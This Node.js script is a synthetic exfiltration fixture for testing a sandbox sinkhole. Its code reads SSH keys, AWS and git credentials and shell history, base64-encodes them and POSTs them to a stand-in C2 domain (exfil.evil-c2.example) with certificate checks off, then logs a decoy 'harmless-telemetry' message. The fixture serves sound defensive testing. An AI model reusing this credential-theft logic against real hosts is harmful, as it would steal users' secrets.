/*
 * SYNTHETIC EXFILTRATION FIXTURE — Claude Rabbit monitored-sinkhole proof.
 * NOT real malware. NOT to be published. Authored locally for the live GCP
 * proof that the sinkhole intercepts egress and captures full intent while NO
 * real packet ever reaches the real destination.
 *
 * On run it:
 *   1. Reads credential-bearing decoy paths (the sandbox plants canaries here).
 *   2. RESOLVES an evil C2 domain (exfil.evil-c2.example) — under the sinkhole
 *      this DNS query is answered by the trap (the trap's own IP).
 *   3. POSTs the "stolen" decoy data over HTTPS to that domain — under the
 *      sinkhole the connection is DNAT'd to the trap, which terminates it,
 *      records the SNI/Host/path/payload INERT, and answers 200 so this code
 *      believes the exfil succeeded. NO packet reaches the real internet.
 *
 * CommonJS Node script that runs INSIDE the sandbox (not part of the Next.js
 * module graph). require/empty-catch are deliberate payload traits.
 */
/* eslint-disable @typescript-eslint/no-require-imports, @typescript-eslint/no-unused-vars */
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const dns = require('dns');

const C2_DOMAIN = 'exfil.evil-c2.example';

// 1) Collect "loot" from decoy credential paths.
const home = os.homedir();
const targets = [
  path.join(home, '.ssh', 'id_rsa'),
  path.join(home, '.ssh', 'id_ed25519'),
  path.join(home, '.aws', 'credentials'),
  path.join(home, '.git-credentials'),
  path.join(home, '.bash_history'),
];
let loot = '';
for (const t of targets) {
  try {
    loot += `\n### ${t}\n` + fs.readFileSync(t, 'utf8');
    console.log('[exfil] read', t);
  } catch (e) {
    /* file may not exist */
  }
}

// 2) Resolve the C2 domain (sinkhole answers with the trap IP).
dns.lookup(C2_DOMAIN, (err, address) => {
  console.log('[exfil] resolved', C2_DOMAIN, '->', err ? err.code : address);

  // 3) Exfiltrate over HTTPS. The sinkhole DNATs this to the trap; the trap
  //    captures the SNI (exfil.evil-c2.example), the path, and the payload.
  const payload = Buffer.from(loot || 'no-loot').toString('base64');
  const req = https.request(
    {
      hostname: C2_DOMAIN,
      port: 443,
      path: '/collect?id=victim-001',
      method: 'POST',
      timeout: 5000,
      rejectUnauthorized: false, // accept the trap's throwaway cert
      headers: {
        'Content-Type': 'application/octet-stream',
        'X-Exfil-Tag': 'cr-sinkhole-proof',
      },
    },
    (res) => {
      console.log('[exfil] C2 response status', res.statusCode, '(sinkhole-served — nothing left the sandbox)');
    }
  );
  req.on('error', (e) => console.log('[exfil] attempt error:', e.code || e.message));
  req.on('timeout', () => req.destroy());
  req.write(payload);
  req.end();
});

console.log('harmless-telemetry started');
